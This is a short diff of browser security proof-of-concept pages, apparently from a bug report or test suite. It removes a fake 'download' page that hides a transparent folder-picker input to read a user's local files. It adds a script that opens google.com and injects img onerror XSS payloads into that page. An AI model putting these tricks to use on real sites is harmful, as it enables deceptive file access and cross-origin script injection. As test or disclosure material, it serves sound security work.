@@ -1,33 +1,11 @@
- <html>
- <head>
-<title> Downloading file</title>
-<style>
-#thing{
-top:80px;
-position:absolute;
-opacity:0.0;
-}
-</style>
- </head>
- <body>
- <input id="thing" type="file" webkitdirectory="true" />
-<h3> About to upload a file ('ReadMe.txt') to your local disk...</h3>
- 1. Select the folder you want your file to upload to.<br><button id="qbutt">Select folder to upload to</button><br>
- 2. Click 'download' to start file download.<br><button disabled=true>Download file</button>
- 
- <script>
- 		  var r = new FileReader();
-        thing.onchange = function() {
-            alert('I can read ' + this.files.length + ' files from your pc!');
-			r.onload=function(){
-				alert(r.result);
-			};
-			
-			r.readAsText(thing.files[0]);
-        };
-		
- </script>
-  
- </body>
- </html>
- 
+<script>
+  function y() {
+    x = open('https://www.google.com', '_top'),
+    x.document.title = '', 
+    x.document.body.innerHTML = 
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">'
+   };
+   setTimeout(y, 10);
+</script>
